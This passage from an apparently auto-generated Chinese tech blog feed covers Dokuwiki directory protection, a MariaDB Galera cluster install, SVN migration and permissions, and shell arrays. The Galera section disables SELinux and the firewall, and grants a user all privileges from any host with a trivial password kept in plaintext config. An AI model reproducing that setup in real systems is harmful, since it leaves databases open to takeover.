<p>下载解压, 将解压文件配置为nginx虚拟主机根目录</p>
<p>主要讲下安全设置</p>
<p>主要是禁止直接访问</p>
<ul>
<li>data</li>
<li>conf</li>
<li>bin</li>
</ul>
<p>这三个目录</p>
<p>检测方式是看能否访问到</p>
<p><a href="http://yoursite.com/data/pages/wiki/dokuwiki.txt">http://yoursite.com/data/pages/wiki/dokuwiki.txt</a></p>]]>
    
    </summary>
    
      <category term="Dokuwiki" scheme="http://yoursite.com/tags/Dokuwiki/"/>
    
      <category term="nginx" scheme="http://yoursite.com/tags/nginx/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[MySQL Galera Cluster 学习]]></title>
    <link href="http://yoursite.com/2016/04/13/MySQL-Galera-Cluster-%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2016/04/13/MySQL-Galera-Cluster-学习/</id>
    <published>2016-04-13T09:07:44.000Z</published>
    <updated>2016-04-20T00:34:45.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://galeracluster.com/documentation-webpages/" target="_blank" rel="external">官网文档</a></p>
<h2 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h2><h3 id="u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5"><a href="#u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5" class="headerlink" title="有三种版本可以选择安装"></a>有三种版本可以选择安装</h3><ul>
<li>mysql 版本</li>
<li>Percona XtraDB Cluster 版本</li>
<li>Mariadb 版本</li>
</ul>
<h3 id="u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A"><a href="#u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A" class="headerlink" title="安装遇到很多坑:"></a>安装遇到很多坑:</h3><p>比如, 安装 mysql 版本的, 更新 yum 源时候, 被墙了:</p>
<pre><code>http://releases.galeracluster.com/centos/6/x86_64/repodata/repomd.xml: [Errno 14] PYCURL ERROR 6 - &quot;Couldn&apos;t resolve host &apos;releases.galeracluster.com&apos;&quot;
Trying other mirror.
Error: Cannot retrieve repository metadata (repomd.xml) for repository: galera. Please verify its path and try again
</code></pre><p>比如, 安装 Percona XtraDB Cluster 版本的, 提示仓库没那个软件包…</p>
<pre><code>[root@node2 ~]#  yum install Percona-XtraDB-Cluster -y
Loaded plugins: security
Setting up Install Process
No package Percona-XtraDB-Cluster available.
Error: Nothing to do
</code></pre><p>比如, 装了 PXC 的 yum 仓库包之后, 再装 mariadb, 会产生软件包冲突, md 得格式化系统了 - -</p>
<pre><code>Transaction Check Error:
  file /usr/lib64/libmysqlclient.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /usr/lib64/libmysqlclient_r.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /etc/my.cnf from install of MariaDB-common-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
</code></pre><a id="more"></a>
<h3 id="u5B89_u88C5Mariadb__u7248_u672C_3A"><a href="#u5B89_u88C5Mariadb__u7248_u672C_3A" class="headerlink" title="安装Mariadb 版本:"></a>安装Mariadb 版本:</h3><h4 id="u660E_u767D_u5B89_u88C5_u7684_u662F_u4EC0_u4E48"><a href="#u660E_u767D_u5B89_u88C5_u7684_u662F_u4EC0_u4E48" class="headerlink" title="明白安装的是什么"></a>明白安装的是什么</h4><p>安装的是数据库命令行客户端, 打了 wsrep API 补丁的数据库服务器, 还有 Galera 集群插件</p>
<blockquote>
<p>There are three packages involved in the installation of MariaDB Galera Cluster: the MariaDB database client, a command line tool for accessing the database; the MariaDB database server, built to include the wsrep API patch; and the Galera Replication Plugin.</p>
</blockquote>
<p>跟普通的数据库包有什么不同?<br>&gt;<br>Binary installation packages for Galera Cluster include the database server with the wsrep API patch. When building from source, you must apply this patch yourself.</p>
<p>了解上面之后, 开始安装. 我用的 centos6.5 ,先把 selinux, 防火墙啥的都关了</p>
<pre><code>[root@node1,2,3 ~]# cat /etc/yum.repos.d/MariaDB.repo
[mariadb]
name = MariaDB
baseurl = http://yum.mariadb.org/10.0/centos6-amd64
gpgkey = https://yum.mariadb.org/RPM-GPG-KEY-MariaDB
gpgcheck = 1
</code></pre><p>见鬼, 阿里云的 dns 解析居然解析不到 yum.mariadb.org , 将 dns 修改为114的才行</p>
<pre><code>[root@node1,2,3 ~]# yum clean all
[root@node1,2,3 ~]# yum makecache
[root@node1,2,3 ~]# yum install MariaDB-client MariaDB-Galera-server galera -y
</code></pre><p>折腾了一番, 终于装上了</p>
<pre><code>[root@node1,2,3 ~]# mysql --version
mysql  Ver 15.1 Distrib 10.0.24-MariaDB, for Linux (x86_64) using readline 5.1
</code></pre><p><a href="http://galeracluster.com/documentation-webpages/installmariadb.html" target="_blank" rel="external">安装参考</a></p>
<h2 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="配置"></a>配置</h2><p><del>创建数据库目录</del></p>
<p><del>mkdir -p /data/MariaDB/data</del></p>
<p><del>chown -R mysql:mysql /data/MariaDB/</del></p>
<h3 id="u521D_u59CB_u5316_u914D_u7F6E"><a href="#u521D_u59CB_u5316_u914D_u7F6E" class="headerlink" title="初始化配置"></a>初始化配置</h3><pre><code>[root@node1,2,3 ~]# service mysql start
[root@node1,2,3 ~]# mysql_secure_installation   #生成 root 密码, 别的全选 y
[root@node1,2,3 ~]# chkconfig mysql on
</code></pre><h3 id="u521B_u5EFA"><a href="#u521B_u5EFA" class="headerlink" title="创建"></a>创建</h3><pre><code>集群同步用户
mysql -uroot -p
GRANT ALL PRIVILEGES ON *.* TO &apos;cluster&apos;@&apos;%&apos; IDENTIFIED BY &apos;lookback&apos; WITH GRANT OPTION;
FLUSH PRIVILEGES;
</code></pre><h3 id="u4FEE_u6539_u914D_u7F6E_u6587_u4EF6"><a href="#u4FEE_u6539_u914D_u7F6E_u6587_u4EF6" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>node1</p>
<pre><code>[root@node1 ~]# sed -ne &apos;/\[mariadb-10.0\]/,$p&apos; /etc/my.cnf.d/server.cnf
[mariadb-10.0]

query_cache_size=0
binlog_format=ROW
default_storage_engine=innodb
innodb_autoinc_lock_mode=2
wsrep_provider=/usr/lib64/galera/libgalera_smm.so
###这里需要注意，如果集群是第一次启动请用当前配置，等其他节点启动起来后将下面两行的注释对换重启本节点就OK
wsrep_cluster_address=&quot;gcomm://&quot;
#wsrep_cluster_address=&quot;gcomm://10.45.207.236,10.174.246.101,10.251.174.207&quot;
wsrep_cluster_name=&apos;cluster1&apos;
wsrep_node_address=&apos;10.45.207.236&apos;
wsrep_node_name=&apos;node1&apos;
wsrep_sst_method=rsync
wsrep_sst_auth=cluster:lookback
</code></pre><p>注意<code>wsrep_provider=/usr/lib64/galera/libgalera_smm.so</code> so 文件的真实位置</p>
<p>node2</p>
<pre><code>[root@node2 ~]# sed -ne &apos;/\[mariadb-10.0\]/,//p&apos; /etc/my.cnf.d/server.cnf
[mariadb-10.0]

query_cache_size=0
binlog_format=ROW
default_storage_engine=innodb
innodb_autoinc_lock_mode=2
wsrep_provider=/usr/lib64/galera/libgalera_smm.so
wsrep_cluster_address=&quot;gcomm://10.45.207.236,10.174.246.101,10.251.174.207&quot;
wsrep_cluster_name=&apos;cluster1&apos;
wsrep_node_address=&apos;10.174.246.101&apos;
wsrep_node_name=&apos;node2&apos;
wsrep_sst_method=rsync
wsrep_sst_auth=cluster:lookback
</code></pre><p>node3</p>
<pre><code>[root@node3 ~]# sed -ne &apos;/\[mariadb-10.0\]/,//p&apos; /etc/my.cnf.d/server.cnf
[mariadb-10.0]

query_cache_size=0
binlog_format=ROW
default_storage_engine=innodb
innodb_autoinc_lock_mode=2
wsrep_provider=/usr/lib64/galera/libgalera_smm.so
wsrep_cluster_address=&quot;gcomm://10.45.207.236,10.174.246.101,10.251.174.207&quot;
wsrep_cluster_name=&apos;cluster1&apos;
wsrep_node_address=&apos;10.251.174.207&apos;
wsrep_node_name=&apos;node3&apos;
wsrep_sst_method=rsync
wsrep_sst_auth=cluster:lookback
</code></pre><p>一些共同的参数配置:</p>
<p>[mysqld]下都加上 skip-name-resolve</p>
<h3 id="u8BBE_u7F6Eswap"><a href="#u8BBE_u7F6Eswap" class="headerlink" title="设置swap"></a>设置swap</h3><pre><code>[root@node2 ~]# fallocate -l 512M /swapfile
[root@node2 ~]# chmod 600 /swapfile
[root@node2 ~]# mkswap /swapfile
[root@node2 ~]# swapon /swapfile
[root@node2 ~]# mount -a
[root@node2 ~]# cat /etc/fstab |grep swap
# swapfile
/swapfile none swap defaults 0 0
[root@node2 ~]# swapon --summary
Filename                                Type            Size    Used    Priority
/swapfile                               file            524280  0       -1
</code></pre><h2 id="u542F_u52A8"><a href="#u542F_u52A8" class="headerlink" title="启动"></a>启动</h2><p>先启动 node1的mariadb, 然后启动 node2, node3<br>然后修改 node1配置文件, 对换 gcomm 那里的配置, 重启 node1的mariadb<br>进入各个 node 的数据库, 查看</p>
<pre><code>MariaDB [(none)]&gt; SHOW STATUS LIKE &apos;wsrep%&apos;;

 +---------------------------+------------+
 | Variable_name             | Value      |
 +---------------------------+------------+
 ...
 | wsrep_local_state_comment | Synced (6) |
 | wsrep_cluster_size        | 3          |
 | wsrep_ready               | ON         |
 +---------------------------+------------+
</code></pre><h2 id="u6D4B_u8BD5"><a href="#u6D4B_u8BD5" class="headerlink" title="测试"></a>测试</h2><p>1.节点写入测试,分别在3台 node 上进行写入测试</p>
<pre><code>CREATE DATABASE galeratest;
USE galeratest;
CREATE TABLE test_table (
        id INT PRIMARY KEY AUTO_INCREMENT,
        msg TEXT ) ENGINE=InnoDB;
INSERT INTO test_table (msg)
        VALUES (&quot;Hello my dear cluster.&quot;);
INSERT INTO test_table (msg)
        VALUES (&quot;Hello, again, cluster dear.&quot;);
</code></pre><p>2.脑裂测试</p>
<p>扩展阅读:</p>
<p><a href="http://my.oschina.net/moooofly/blog/92288" target="_blank" rel="external">HA 集群的脑裂问题</a></p>
<p>参考:</p>
<p><a href="http://www.dwhd.org/20150924_133631.html" target="_blank" rel="external">Linux之CentOS 6.7上编译+YUM两种方法配置MariaDB Galera多主集群实现HA</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://galeracluster.com/documentation-webpages/">官网文档</a></p>
<h2 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h2><h3 id="u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5"><a href="#u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5" class="headerlink" title="有三种版本可以选择安装"></a>有三种版本可以选择安装</h3><ul>
<li>mysql 版本</li>
<li>Percona XtraDB Cluster 版本</li>
<li>Mariadb 版本</li>
</ul>
<h3 id="u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A"><a href="#u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A" class="headerlink" title="安装遇到很多坑:"></a>安装遇到很多坑:</h3><p>比如, 安装 mysql 版本的, 更新 yum 源时候, 被墙了:</p>
<pre><code>http://releases.galeracluster.com/centos/6/x86_64/repodata/repomd.xml: [Errno 14] PYCURL ERROR 6 - &quot;Couldn&apos;t resolve host &apos;releases.galeracluster.com&apos;&quot;
Trying other mirror.
Error: Cannot retrieve repository metadata (repomd.xml) for repository: galera. Please verify its path and try again
</code></pre><p>比如, 安装 Percona XtraDB Cluster 版本的, 提示仓库没那个软件包…</p>
<pre><code>[root@node2 ~]#  yum install Percona-XtraDB-Cluster -y
Loaded plugins: security
Setting up Install Process
No package Percona-XtraDB-Cluster available.
Error: Nothing to do
</code></pre><p>比如, 装了 PXC 的 yum 仓库包之后, 再装 mariadb, 会产生软件包冲突, md 得格式化系统了 - -</p>
<pre><code>Transaction Check Error:
  file /usr/lib64/libmysqlclient.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /usr/lib64/libmysqlclient_r.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /etc/my.cnf from install of MariaDB-common-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
</code></pre>]]>
    
    </summary>
    
      <category term="Galera" scheme="http://yoursite.com/tags/Galera/"/>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn仓库间数据转移, 回滚, 子目录权限控制]]></title>
    <link href="http://yoursite.com/2016/04/12/svn%E4%BB%93%E5%BA%93%E9%97%B4%E6%95%B0%E6%8D%AE%E8%BD%AC%E7%A7%BB/"/>
    <id>http://yoursite.com/2016/04/12/svn仓库间数据转移/</id>
    <published>2016-04-12T01:36:17.000Z</published>
    <updated>2016-05-10T10:16:04.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u8D77_u56E0"><a href="#u8D77_u56E0" class="headerlink" title="起因"></a>起因</h3><p>由于之前的同事没有好好规划 svn 仓库结构, 现需要重新规划目录结构如下:</p>
<pre><code>project1
    ├── branches
    ├── tags
    └── trunk
        ├── code
        │   ├── andriod
        │   ├── ios
        │   ├── php
        │   └── sql
        ├── doc
        └── readme.txt
</code></pre><p><strong>trunk</strong>是主分支，是日常开发进行的地方。</p>
<p><strong>branches</strong>是分支。一些阶段性的release版本，这些版本是可以继续进行开发和维护的，则放在branches目录中。又比如为不同用户客制化的版本，也可以放在分支中进行开发。</p>
<p><strong>tags</strong>目录一般是只读的，这里存储阶段性的发布版本，只是作为一个里程碑的版本进行存档。    </p>
<p>现在需要将分散的代码仓库都迁移放到 <em>trunk-code</em> 目录下进行分类存放, 并规划相应仓库的人员权限</p>
<a id="more"></a>
<h3 id="u6743_u9650_u6D4B_u8BD5"><a href="#u6743_u9650_u6D4B_u8BD5" class="headerlink" title="权限测试"></a>权限测试</h3><p>由于迁移得先通知部门成员, 停止提交并暂停 svn 服务, 估计得找个夜黑风高的时候进行, 大白天的我还是先测试一下子目录里仓库的人员权限吧</p>
<p>虽说是权限测试, 我们也得搞点数据过来, 顺便当代码仓库迁移演练吧</p>
<h4 id="u4ED3_u5E93_u95F4_u6570_u636E_u8FC1_u79FB_u65B9_u5F0F_3A"><a href="#u4ED3_u5E93_u95F4_u6570_u636E_u8FC1_u79FB_u65B9_u5F0F_3A" class="headerlink" title="仓库间数据迁移方式:"></a>仓库间数据迁移方式:</h4><p>不能直接将A仓库重命名为B，或将A复制得到一个复本，再将复本命名为B</p>
<p>使用<em>svnadmin dump</em> &amp; <em>svnadmin load</em></p>
<p>创建B仓库(如果B不存在)</p>
<pre><code>svnadmin create /svndata/B    
</code></pre><p>导出A仓库</p>
<pre><code>svnadmin dump /svndata/A &gt; A.dump    
</code></pre><p>将 A仓库 备份文件导入 B 仓库</p>
<pre><code>svnadmin load /svndata/B &lt; A.dump
</code></pre><h4 id="u7136_u800C_u95EE_u9898_u6765_u4E86"><a href="#u7136_u800C_u95EE_u9898_u6765_u4E86" class="headerlink" title="然而问题来了"></a>然而问题来了</h4><p>发现设想的svn目录结构不太好实现, 因为svn 不支持仓库里面创建子仓库, 只能自己创建子目录</p>
<pre><code># svnadmin create project1/trunk
svnadmin: E165002: &apos;/data/svndata/project1/trunk&apos; is a subdirectory of an existing repository rooted at &apos;/data/svndata/project1&apos;
</code></pre><p>如果是通过子目录的方式, 假设ios 目录的代码要回滚, 那岂不是整个代码仓库都要跟着回滚了?</p>
<p>不过也不确定能不能只回滚单个目录, 还得实验测试一下</p>
<p>而且通过 checkout 旧仓库到子目录, 然后再 add/commit 到新仓库的方式, 旧仓库的历史记录不就都丢失了么? 因为不删除 .svn 就无法 add, 会报错的</p>
<pre><code>svn: warning: W150002: &apos;/opt/www/svnhook/project1/trunk/code/php/everouter_app&apos; is already under version control
svn: E200009: Could not add all targets because some targets are already versioned
svn: E200009: Illegal target for the requested operation
</code></pre><p>如果能接受丢失旧库历史版本, 那么测试一下能不能只回滚单个目录(经下方检测, 是可以的)</p>
<h4 id="u597D_u5427_2C__u987A_u4FBF_u6765_u5B66_u4E60_u4E00_u4E0B_svn__u7684_u56DE_u6EDA"><a href="#u597D_u5427_2C__u987A_u4FBF_u6765_u5B66_u4E60_u4E00_u4E0B_svn__u7684_u56DE_u6EDA" class="headerlink" title="好吧, 顺便来学习一下 svn 的回滚"></a>好吧, 顺便来学习一下 svn 的回滚</h4><p>先分别到2个子目录做变更提交</p>
<pre><code>[root@iZ94c5cs7guZ everouter_app]# touch outest
[root@iZ94c5cs7guZ everouter_app]# svn add outest
A         outest
[root@iZ94c5cs7guZ everouter_app]# svn ci -m &quot;add outest&quot;

[root@iZ94c5cs7guZ everinner_app]# touch intest
[root@iZ94c5cs7guZ everinner_app]# svn add intest
A         intest
[root@iZ94c5cs7guZ everinner_app]# svn ci -m &quot;add intest&quot;    
</code></pre><p>还有2个未提交的    </p>
<pre><code>[root@iZ94c5cs7guZ everinner_app]# echo 123 &gt; intest
[root@iZ94c5cs7guZ everinner_app]# svn st
M       intest
[root@iZ94c5cs7guZ everinner_app]# cd ..
[root@iZ94c5cs7guZ php]# cd everouter_app/
[root@iZ94c5cs7guZ everouter_app]# echo 456 &gt; outest
[root@iZ94c5cs7guZ everouter_app]# svn st
M       outest
[root@iZ94c5cs7guZ everouter_app]# cd ..
[root@iZ94c5cs7guZ php]# svn st
M       everinner_app/intest
M       everouter_app/outest
</code></pre><p>现在有2个尚未提交的改动, 试试看能不能只 revert 其中一个</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn revert everinner_app/intest
Reverted &apos;everinner_app/intest&apos;
[root@iZ94c5cs7guZ php]# svn st
M       everouter_app/outest
</code></pre><p>好, 可以睇到, 单独 revert 一个未 commit 的文件系某问题嘅</p>
<p>然后测试对整个目录的回滚, 先进行一些变更</p>
<pre><code>[root@iZ94c5cs7guZ php]# cd everinner_app/
[root@iZ94c5cs7guZ everinner_app]# echo 789 &gt; intest
[root@iZ94c5cs7guZ everinner_app]# cd conf/
[root@iZ94c5cs7guZ conf]# echo 456 &gt; intest2
[root@iZ94c5cs7guZ conf]# svn add intest2
A         intest2
[root@iZ94c5cs7guZ conf]# cd ..
[root@iZ94c5cs7guZ everinner_app]# svn st
M       conf/intest2
M       intest
</code></pre><p>看看发生的变更</p>
<pre><code>[root@iZ94c5cs7guZ everinner_app]# cd ..
[root@iZ94c5cs7guZ php]# svn st
A       everinner_app/conf/intest2
M       everinner_app/intest
M       everouter_app/outest
</code></pre><p>回滚everinner_app目录</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn revert everinner_app/ --recursive
Reverted &apos;everinner_app/conf/intest2&apos;
Reverted &apos;everinner_app/intest&apos;
[root@iZ94c5cs7guZ php]# svn st
M       everouter_app/outest
</code></pre><p>可以看出, 未 commit 的目录也是可以整个回滚的, 但是具体到开发人员使用会是怎样的一种情况呢…</p>
<p>那么已经 commit 的情况下呢?</p>
<p>查看一下提交的历史记录</p>
<pre><code>$ svn update

$ svn log|less

------------------------------------------------------------------------
r5 | hugo | 2016-04-12 16:02:32 +0800 (Tue, 12 Apr 2016) | 1 line

666 outest
------------------------------------------------------------------------
r4 | hugo | 2016-04-12 15:59:55 +0800 (Tue, 12 Apr 2016) | 1 line

add outest change
------------------------------------------------------------------------
r3 | hugo | 2016-04-12 14:20:01 +0800 (Tue, 12 Apr 2016) | 1 line

add outest
------------------------------------------------------------------------
r2 | hugo | 2016-04-12 14:19:25 +0800 (Tue, 12 Apr 2016) | 1 line

add intest
------------------------------------------------------------------------
r1 | hugo | 2016-04-12 11:56:01 +0800 (Tue, 12 Apr 2016) | 1 line

add trunk/code/php/everinner_app and trunk/code/php/everouter_app
------------------------------------------------------------------------
(END)
</code></pre><p>假设我们outest 文件修改错了, 要回滚到r3版本(当前版本是 r5, ), 先对比一下</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn diff -r 5:3 everouter_app/outest
Index: everouter_app/outest
===================================================================
--- everouter_app/outest    (revision 5)
+++ everouter_app/outest    (revision 3)
@@ -1,2 +0,0 @@
-456
-666
</code></pre><p>可以看出 r3版本是没有456,666这两行的,确定无误之后, 用 merge 回滚</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn merge -r 5:3 everouter_app/outest
--- Reverse-merging r5 through r4 into &apos;everouter_app/outest&apos;:
U    everouter_app/outest
--- Recording mergeinfo for reverse merge of r5 through r4 into &apos;everouter_app/outest&apos;:
 U   everouter_app/outest
--- Eliding mergeinfo from &apos;everouter_app/outest&apos;:
 U   everouter_app/outest
[root@iZ94c5cs7guZ php]# cat everouter_app/outest
[root@iZ94c5cs7guZ php]#
</code></pre><p>确认无误后, 提交</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn commit -m &quot;revert to revision 3&quot;
Sending        everouter_app/outest
Transmitting file data .
Committed revision 6.
</code></pre><p>如果 outer 目录和 inner 目录都有变更, 回滚会不会互相影响呢, 用脚趾头想想是会的</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn diff -r 7:4
Index: everinner_app/intest
===================================================================
--- everinner_app/intest    (revision 7)
+++ everinner_app/intest    (revision 4)
@@ -1 +0,0 @@
-123
Index: everouter_app/outest
===================================================================
--- everouter_app/outest    (revision 7)
+++ everouter_app/outest    (revision 4)
@@ -0,0 +1 @@
+456  
</code></pre><p>看上面的对比, 如果我们想要回到版本4,让 intest 去掉123那行, 那么会使得 outest 增加456, 相互影响了</p>
<p>好吧, 子目录的回滚之谜已经解决, 结论就是未 commit 的可以目录内 revert, 子目录间不受影响</p>
<p>已经 commit 的则不能随意 merge 了, 会影响到其他目录内容</p>
<h4 id="u6B63_u5F0F_u5F00_u59CB_u6743_u9650_u6D4B_u8BD5"><a href="#u6B63_u5F0F_u5F00_u59CB_u6743_u9650_u6D4B_u8BD5" class="headerlink" title="正式开始权限测试"></a>正式开始权限测试</h4><p>搞了这么多,目录结构也比较复杂了, 可以开始子目录的权限控制测试了</p>
<p>现在进行用户规划管理</p>
<p>admin 拥有project1所有的控制权限</p>
<p>cto 拥有code目录以及子目录的权限</p>
<p>in_user 拥有inner 目录的权限</p>
<p>ou_user 拥有outer 目录的权限</p>
<p>authz文件(才发现直接修改配置文件, 不用重启 svn 就能生效)</p>
<pre><code>[groups]
cto = ctouser
in_user = hxk
ou_user = cn

[svndata:/project1]
@cto = r

[svndata:/project1/trunk/code]
@cto = rw
</code></pre><p>checkout 试试</p>
<pre><code>$ svn co   svn://test.svn.cn/project1/trunk/code  --username ctouser
A    code/php
A    code/php/everinner_app
A    code/php/everinner_app/conf
A    code/php/everinner_app/conf/config.php    
...    
</code></pre><p>疗效不错,结果发现没有写权限╮(╯_╰)╭</p>
<p>结果都是泪啊:</p>
<p><em>用户在父目录的权限会把子目录的给覆盖​, 无法进行有效的用户权限控制.</em></p>
<p>你可能会说, 直接在子目录给权限不就行了, 抱歉, 这样连根目录的读权限都没有, 是不能通过验证的</p>
<h3 id="u65E5_u4E86_uD83D_uDC36_2C__u53D1_u73B0_u4EE5_u524D_u88AB_u67D0_u7BC7_u6587_u7AE0_u8BEF_u5BFC_u4E86_2C__u539F_u6765_u662F_u80FD_u505A_u5B50_u76EE_u5F55_u6743_u9650_u63A7_u5236_u7684_21"><a href="#u65E5_u4E86_uD83D_uDC36_2C__u53D1_u73B0_u4EE5_u524D_u88AB_u67D0_u7BC7_u6587_u7AE0_u8BEF_u5BFC_u4E86_2C__u539F_u6765_u662F_u80FD_u505A_u5B50_u76EE_u5F55_u6743_u9650_u63A7_u5236_u7684_21" class="headerlink" title="日了🐶, 发现以前被某篇文章误导了, 原来是能做子目录权限控制的!"></a>日了🐶, 发现以前被某篇文章误导了, 原来是能做子目录权限控制的!</h3><p>正确的写法是这样:</p>
<pre><code>[/]
@admin = r
@dev = r
@hook = r

[/branches]
@dev = rw

[/trunk]
kali = rw
lilia = rw

[/tags]
admin = rw
</code></pre><p>真是被某些文章误导了!以后还是直接看官网文档吧 - -</p>
<p>扩展阅读:</p>
<p><a href="http://developer.51cto.com/art/201005/201718.htm" target="_blank" rel="external">SVN中tag branch trunk用法详解</a>    </p>
<p>参考:</p>
<p><a href="http://blog.csdn.net/pttaag/article/details/8076210" target="_blank" rel="external">SVN的标准目录结构：trunk、branches、tags</a></p>
<p><a href="http://huguiqi.com/2016/03/07/linux%E4%B8%8BSVN%E4%BB%93%E5%BA%93%E9%97%B4%E6%95%B0%E6%8D%AE%E8%BD%AC%E7%A7%BB%E6%88%96%E9%87%8D%E5%91%BD%E5%90%8D/" target="_blank" rel="external">linux下SVN仓库间数据转移或重命名</a></p>
<p><a href="http://holbrook.github.io/2014/01/29/svn_install_config_and_mgnt.html" target="_blank" rel="external">subversion安装、配置和管理</a></p>
<p><a href="http://hushicai.com/2014/03/06/ming-ling-xing-zhong-hui-gun-svn.html" target="_blank" rel="external">命令行中回滚svn</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u8D77_u56E0"><a href="#u8D77_u56E0" class="headerlink" title="起因"></a>起因</h3><p>由于之前的同事没有好好规划 svn 仓库结构, 现需要重新规划目录结构如下:</p>
<pre><code>project1
    ├── branches
    ├── tags
    └── trunk
        ├── code
        │   ├── andriod
        │   ├── ios
        │   ├── php
        │   └── sql
        ├── doc
        └── readme.txt
</code></pre><p><strong>trunk</strong>是主分支，是日常开发进行的地方。</p>
<p><strong>branches</strong>是分支。一些阶段性的release版本，这些版本是可以继续进行开发和维护的，则放在branches目录中。又比如为不同用户客制化的版本，也可以放在分支中进行开发。</p>
<p><strong>tags</strong>目录一般是只读的，这里存储阶段性的发布版本，只是作为一个里程碑的版本进行存档。    </p>
<p>现在需要将分散的代码仓库都迁移放到 <em>trunk-code</em> 目录下进行分类存放, 并规划相应仓库的人员权限</p>]]>
    
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Shell数组]]></title>
    <link href="http://yoursite.com/2016/04/08/Shell%E6%95%B0%E7%BB%84/"/>
    <id>http://yoursite.com/2016/04/08/Shell数组/</id>
    <published>2016-04-08T03:19:37.000Z</published>
    <updated>2016-04-14T01:44:33.000Z</updated>
    <content type="html"><![CDATA[<h3 id="Linux_Shell_u4E2D_u7684_u6570_u7EC4_u53CA_u904D_u5386"><a href="#Linux_Shell_u4E2D_u7684_u6570_u7EC4_u53CA_u904D_u5386" class="headerlink" title="Linux Shell中的数组及遍历"></a><a href="http://blog.csdn.net/redhat456/article/details/6068409" target="_blank" rel="external">Linux Shell中的数组及遍历</a></h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数组赋值</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># a=(1 2 3 b c d)</span></span><br><span class="line"><span class="comment"># 调用数组元素</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[0]&#125;</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[1]&#125;</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[3]&#125;</span></span><br><span class="line">b    </span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[@]&#125;</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> b c d</span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># for i in $&#123;a[@]&#125;; do echo $i; done</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br></pre></td></tr></table></figure>
<a id="more"></a>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Linux_Shell_u4E2D_u7684_u6570_u7EC4_u53CA_u904D_u5386"><a href="#Linux_Shell_u4E2D_u7684_u6570_u7EC4_u53CA_u904D_u5386" class="headerlink" title="Linux Shell中的数组及遍历"></a><a href="http://blog.csdn.net/redhat456/article/details/6068409">Linux Shell中的数组及遍历</a></h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数组赋值</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># a=(1 2 3 b c d)</span></span><br><span class="line"><span class="comment"># 调用数组元素</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[0]&#125;</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[1]&#125;</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">root<span class="variable">@Ubuntu</span><span class="symbol">:~</span><span class="comment"># echo $&#123;a[3]&#125;</span></span><br><span class="line">b    </span><br><span class="line">root<span 